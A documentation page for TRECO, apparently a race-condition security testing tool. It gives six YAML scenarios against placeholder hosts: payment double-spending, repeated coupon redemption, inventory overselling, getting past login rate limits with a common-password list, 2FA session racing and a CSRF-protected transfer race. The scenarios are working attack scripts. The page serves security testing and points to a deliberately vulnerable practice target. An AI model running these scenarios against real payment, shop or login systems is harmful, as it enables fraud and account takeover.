Attack Examples
===============

This page provides real-world examples of race condition attacks using TRECO.

Double-Spending Attack
----------------------

Test if a payment can be processed multiple times.

.. code-block:: yaml

   metadata:
     name: "Double-Spending Attack"
     version: "1.0"
     author: "Security Researcher"
     vulnerability: "CWE-362"

   target:
     host: "payment.example.com"
     port: 443
     tls:
       enabled: true
       verify_cert: true

   entrypoint:
     state: login
     input:
       username: "{{ env('USERNAME') }}"
       password: "{{ env('PASSWORD') }}"

   states:
     login:
       description: "Authenticate and get payment token"
       request: |
         POST /api/auth/login HTTP/1.1
         Host: {{ config.host }}
         Content-Type: application/json
         
         {"username": "{{ username }}", "password": "{{ password }}"}
       
       extract:
         auth_token:
           type: jpath
           pattern: "$.token"
       
       next:
         - on_status: 200
           goto: get_balance

     get_balance:
       description: "Get initial balance"
       request: |
         GET /api/account/balance HTTP/1.1
         Host: {{ config.host }}
         Authorization: Bearer {{ login.auth_token }}
       
       extract:
         initial_balance:
           type: jpath
           pattern: "$.balance"
       
       logger:
         on_state_leave: |
           Initial balance: ${{ initial_balance }}
       
       next:
         - on_status: 200
           goto: race_payment

     race_payment:
       description: "Race condition - process payment twice"
       request: |
         POST /api/payments/process HTTP/1.1
         Host: {{ config.host }}
         Authorization: Bearer {{ login.auth_token }}
         Content-Type: application/json
         
         {"amount": 100, "recipient": "attacker@example.com"}
       
       race:
         threads: 2
         sync_mechanism: barrier
         connection_strategy: preconnect
         thread_propagation: single
       
       extract:
         transaction_id:
           type: jpath
           pattern: "$.transaction_id"
       
       next:
         - on_status: 200
           goto: verify_balance

     verify_balance:
       description: "Verify final balance"
       request: |
         GET /api/account/balance HTTP/1.1
         Host: {{ config.host }}
         Authorization: Bearer {{ login.auth_token }}
       
       extract:
         final_balance:
           type: jpath
           pattern: "$.balance"
       
       logger:
         on_state_leave: |
           ======================================
           DOUBLE-SPENDING TEST RESULTS
           ======================================
           Initial balance: ${{ get_balance.initial_balance }}
           Final balance: ${{ final_balance }}
           Expected balance: ${{ get_balance.initial_balance - 100 }}
           
           {% if final_balance < get_balance.initial_balance - 100 %}
           ⚠️ VULNERABLE: More money deducted than expected!
           {% else %}
           ✓ PROTECTED: Correct balance
           {% endif %}
           ======================================
       
       next:
         - on_status: 200
           goto: end

     end:
       description: "Test complete"

Coupon Redemption Race
----------------------

Test if a single-use coupon can be redeemed multiple times.

.. code-block:: yaml

   metadata:
     name: "Coupon Redemption Race"
     version: "1.0"
     author: "Security Researcher"
     vulnerability: "CWE-362"

   target:
     host: "shop.example.com"
     port: 443
     tls:
       enabled: true

   entrypoint:
     state: login
     input:
       username: "{{ argv('user', 'testuser') }}"
       password: "{{ env('PASSWORD') }}"
       coupon_code: "{{ argv('coupon', 'SAVE50') }}"

   states:
     login:
       description: "User login"
       request: |
         POST /api/login HTTP/1.1
         Host: {{ config.host }}
         Content-Type: application/json
         
         {"email": "{{ username }}", "password": "{{ password }}"}
       
       extract:
         session_token:
           type: jpath
           pattern: "$.session.token"
         user_credit:
           type: jpath
           pattern: "$.user.store_credit"
       
       logger:
         on_state_leave: |
           Logged in. Store credit: ${{ user_credit }}
       
       next:
         - on_status: 200
           goto: race_redeem

     race_redeem:
       description: "Race - redeem coupon multiple times"
       request: |
         POST /api/coupons/redeem HTTP/1.1
         Host: {{ config.host }}
         Authorization: Bearer {{ login.session_token }}
         Content-Type: application/json
         
         {"code": "{{ coupon_code }}"}
       
       race:
         threads: 10
         sync_mechanism: barrier
         connection_strategy: preconnect
       
       extract:
         redemption_amount:
           type: jpath
           pattern: "$.credited_amount"
       
       logger:
         on_thread_leave: |
           [Thread {{ thread.id }}] Status: {{ status }}, Credited: ${{ redemption_amount }}
       
       next:
         - on_status: 200
           goto: verify
         - on_status: 400
           goto: verify

     verify:
       description: "Check final credit"
       request: |
         GET /api/user/profile HTTP/1.1
         Host: {{ config.host }}
         Authorization: Bearer {{ login.session_token }}
       
       extract:
         final_credit:
           type: jpath
           pattern: "$.store_credit"
       
       logger:
         on_state_leave: |
           ======================================
           COUPON REDEMPTION TEST RESULTS
           ======================================
           Initial credit: ${{ login.user_credit }}
           Final credit: ${{ final_credit }}
           Difference: ${{ final_credit - login.user_credit }}
           
           {% if final_credit > login.user_credit + 50 %}
           ⚠️ VULNERABLE: Coupon redeemed multiple times!
           {% else %}
           ✓ PROTECTED: Single redemption only
           {% endif %}
           ======================================
       
       next:
         - on_status: 200
           goto: end

     end:
       description: "Test complete"

Inventory Race Attack
---------------------

Test if limited inventory items can be over-purchased.

.. code-block:: yaml

   metadata:
     name: "Inventory Race Attack"
     version: "1.0"
     author: "Security Researcher"
     vulnerability: "CWE-362"

   target:
     host: "store.example.com"
     port: 443
     tls:
       enabled: true

   entrypoint:
     state: login
     input:
       username: "{{ env('USERNAME') }}"
       password: "{{ env('PASSWORD') }}"
       product_id: "{{ argv('product', 'LIMITED-001') }}"

   states:
     login:
       description: "Authenticate"
       request: |
         POST /api/auth HTTP/1.1
         Host: {{ config.host }}
         Content-Type: application/json
         
         {"username": "{{ username }}", "password": "{{ password }}"}
       
       extract:
         token:
           type: jpath
           pattern: "$.token"
       
       next:
         - on_status: 200
           goto: check_inventory

     check_inventory:
       description: "Check product availability"
       request: |
         GET /api/products/{{ product_id }} HTTP/1.1
         Host: {{ config.host }}
         Authorization: Bearer {{ login.token }}
       
       extract:
         initial_stock:
           type: jpath
           pattern: "$.inventory.available"
         product_name:
           type: jpath
           pattern: "$.name"
       
       logger:
         on_state_leave: |
           Product: {{ product_name }}
           Available stock: {{ initial_stock }}
       
       next:
         - on_status: 200
           goto: race_purchase

     race_purchase:
       description: "Race - purchase more than available"
       request: |
         POST /api/orders HTTP/1.1
         Host: {{ config.host }}
         Authorization: Bearer {{ login.token }}
         Content-Type: application/json
         
         {"product_id": "{{ product_id }}", "quantity": 1}
       
       race:
         threads: 50
         sync_mechanism: barrier
         connection_strategy: preconnect
       
       extract:
         order_id:
           type: jpath
           pattern: "$.order_id"
         order_status:
           type: jpath
           pattern: "$.status"
       
       logger:
         on_thread_leave: |
           [Thread {{ thread.id }}] Status: {{ status }}, Order: {{ order_id }}
       
       next:
         - on_status: 200
           goto: verify_inventory
         - on_status: 400
           goto: verify_inventory

     verify_inventory:
       description: "Verify final inventory"
       request: |
         GET /api/products/{{ product_id }} HTTP/1.1
         Host: {{ config.host }}
         Authorization: Bearer {{ login.token }}
       
       extract:
         final_stock:
           type: jpath
           pattern: "$.inventory.available"
       
       logger:
         on_state_leave: |
           ======================================
           INVENTORY RACE TEST RESULTS
           ======================================
           Initial stock: {{ check_inventory.initial_stock }}
           Final stock: {{ final_stock }}
           
           {% if final_stock < 0 %}
           ⚠️ VULNERABLE: Negative inventory! Over-sold items.
           {% elif check_inventory.initial_stock - final_stock > check_inventory.initial_stock %}
           ⚠️ VULNERABLE: More items sold than available!
           {% else %}
           ✓ PROTECTED: Inventory properly controlled
           {% endif %}
           ======================================
       
       next:
         - on_status: 200
           goto: end

     end:
       description: "Test complete"

Authentication Rate Limit Bypass
--------------------------------

Test if rate limiting can be bypassed through concurrent requests.

.. code-block:: yaml

   metadata:
     name: "Rate Limit Bypass"
     version: "1.0"
     author: "Security Researcher"
     vulnerability: "CWE-307"

   target:
     host: "auth.example.com"
     port: 443
     tls:
       enabled: true

   entrypoint:
     state: race_login
     input:
       username: "{{ argv('user', 'admin') }}"
       passwords:
         - "password123"
         - "admin123"
         - "letmein"
         - "qwerty"
         - "12345678"

   states:
     race_login:
       description: "Race - bypass rate limiting"
       request: |
         POST /api/login HTTP/1.1
         Host: {{ config.host }}
         Content-Type: application/json
         
         {"username": "{{ username }}", "password": "attempt{{ thread.id }}"}
       
       race:
         threads: 20
         sync_mechanism: barrier
         connection_strategy: preconnect
       
       extract:
         response_message:
           type: jpath
           pattern: "$.message"
       
       logger:
         on_thread_leave: |
           [Thread {{ thread.id }}] Status: {{ status }}, Message: {{ response_message }}
       
       next:
         - on_status: 200
           goto: success
         - on_status: 429
           goto: rate_limited
         - on_status: 401
           goto: end

     success:
       description: "Login succeeded"
       logger:
         on_state_enter: |
           ⚠️ VULNERABLE: Login succeeded despite rate limiting!

     rate_limited:
       description: "Rate limited"
       logger:
         on_state_enter: |
           ✓ PROTECTED: Rate limiting working correctly

     end:
       description: "Test complete"

2FA TOTP Verification
---------------------

Test authentication with TOTP-based 2FA.

.. code-block:: yaml

   metadata:
     name: "2FA Race Condition Test"
     version: "1.0"
     author: "Security Researcher"
     vulnerability: "CWE-362"

   target:
     host: "secure.example.com"
     port: 443
     tls:
       enabled: true

   entrypoint:
     state: login
     input:
       username: "{{ env('USERNAME') }}"
       password: "{{ env('PASSWORD') }}"
       totp_seed: "{{ env('TOTP_SEED') }}"

   states:
     login:
       description: "Initial login"
       request: |
         POST /api/auth/login HTTP/1.1
         Host: {{ config.host }}
         Content-Type: application/json
         
         {"username": "{{ username }}", "password": "{{ password }}"}
       
       extract:
         temp_token:
           type: jpath
           pattern: "$.temp_token"
       
       next:
         - on_status: 200
           goto: race_2fa

     race_2fa:
       description: "Race - 2FA verification"
       request: |
         POST /api/auth/verify-2fa HTTP/1.1
         Host: {{ config.host }}
         Authorization: Bearer {{ login.temp_token }}
         Content-Type: application/json
         
         {"code": "{{ totp(totp_seed) }}"}
       
       race:
         threads: 5
         sync_mechanism: barrier
         connection_strategy: preconnect
       
       extract:
         session_token:
           type: jpath
           pattern: "$.session_token"
       
       logger:
         on_thread_leave: |
           [Thread {{ thread.id }}] Status: {{ status }}
           {% if status == 200 %}
           Session created: {{ session_token }}
           {% endif %}
       
       next:
         - on_status: 200
           goto: check_sessions

     check_sessions:
       description: "Check active sessions"
       request: |
         GET /api/user/sessions HTTP/1.1
         Host: {{ config.host }}
         Authorization: Bearer {{ race_2fa.session_token }}
       
       extract:
         session_count:
           type: jpath
           pattern: "$.sessions.length()"
       
       logger:
         on_state_leave: |
           ======================================
           2FA RACE TEST RESULTS
           ======================================
           Active sessions: {{ session_count }}
           
           {% if session_count > 1 %}
           ⚠️ VULNERABLE: Multiple sessions from single 2FA code!
           {% else %}
           ✓ PROTECTED: Single session created
           {% endif %}
           ======================================
       
       next:
         - on_status: 200
           goto: end

     end:
       description: "Test complete"

CSRF Token Extraction and Form Submission
-----------------------------------------

Complete flow with CSRF token extraction.

.. code-block:: yaml

   metadata:
     name: "CSRF Protected Form Race"
     version: "1.0"
     author: "Security Researcher"
     vulnerability: "CWE-352"

   target:
     host: "webapp.example.com"
     port: 443
     tls:
       enabled: true

   entrypoint:
     state: get_login_page
     input:
       username: "{{ env('USERNAME') }}"
       password: "{{ env('PASSWORD') }}"

   states:
     get_login_page:
       description: "Get login form with CSRF token"
       request: |
         GET /login HTTP/1.1
         Host: {{ config.host }}
       
       extract:
         csrf_token:
           type: xpath
           pattern: '//input[@name="csrf_token"]/@value'
         session_cookie:
           type: cookie
           pattern: "session"
       
       next:
         - on_status: 200
           goto: login

     login:
       description: "Submit login form"
       request: |
         POST /login HTTP/1.1
         Host: {{ config.host }}
         Content-Type: application/x-www-form-urlencoded
         Cookie: session={{ get_login_page.session_cookie }}
         
         username={{ username }}&password={{ password }}&csrf_token={{ get_login_page.csrf_token }}
       
       extract:
         auth_cookie:
           type: cookie
           pattern: "auth_session"
       
       next:
         - on_status: 302
           goto: get_transfer_page

     get_transfer_page:
       description: "Get transfer form"
       request: |
         GET /transfer HTTP/1.1
         Host: {{ config.host }}
         Cookie: auth_session={{ login.auth_cookie }}
       
       extract:
         transfer_csrf:
           type: xpath
           pattern: '//input[@name="_csrf"]/@value'
       
       next:
         - on_status: 200
           goto: race_transfer

     race_transfer:
       description: "Race - submit transfer"
       request: |
         POST /transfer HTTP/1.1
         Host: {{ config.host }}
         Content-Type: application/x-www-form-urlencoded
         Cookie: auth_session={{ login.auth_cookie }}
         
         amount=100&recipient=attacker&_csrf={{ get_transfer_page.transfer_csrf }}
       
       race:
         threads: 5
         sync_mechanism: barrier
         connection_strategy: preconnect
       
       logger:
         on_thread_leave: |
           [Thread {{ thread.id }}] Status: {{ status }}
       
       next:
         - on_status: 200
           goto: end
         - on_status: 302
           goto: end

     end:
       description: "Test complete"

Running the Examples
--------------------

Set up environment variables:

.. code-block:: bash

   export USERNAME='testuser'
   export PASSWORD='testpassword'
   export TOTP_SEED='JBSWY3DPEHPK3PXP'

Run an attack:

.. code-block:: bash

   # Basic run
   uv run treco examples/double-spending.yaml
   
   # With overrides
   uv run treco examples/coupon-race.yaml --user alice --coupon SUMMER25
   
   # Verbose output
   uv run treco examples/inventory-race.yaml --verbose

See Also
--------

* :doc:`configuration` - YAML configuration reference
* :doc:`extractors` - Data extraction methods
* :doc:`templates` - Template syntax and filters
* `Racing Bank <https://github.com/maycon/racing-bank>`_ - Vulnerable test target
